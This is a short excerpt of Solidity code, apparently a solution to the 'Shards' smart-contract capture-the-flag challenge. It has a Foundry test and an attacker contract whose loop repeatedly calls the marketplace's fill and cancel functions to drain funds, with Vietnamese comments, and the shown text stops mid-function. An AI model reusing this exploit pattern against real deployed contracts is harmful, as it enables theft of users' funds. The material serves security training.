...
contract ShardsChallenge is Test {
    ...
    function test_shards() public checkSolvedByPlayer {
        MyContract myContract = new MyContract(marketplace, token, recovery);
        myContract.trigger(1);
    }
...
contract MyContract{
    ...
    function trigger(uint64 offerId) external{
        // Moi lan mua 100 shards
        uint256 shards = 100;

        // Loop de thuc hien ham fill
        for (uint256 i = 0; i < 10001; i++){
            marketplace.fill(offerId, shards);
            marketplace.cancel(1, i);
        }

        // Chuyen tien cho recovery
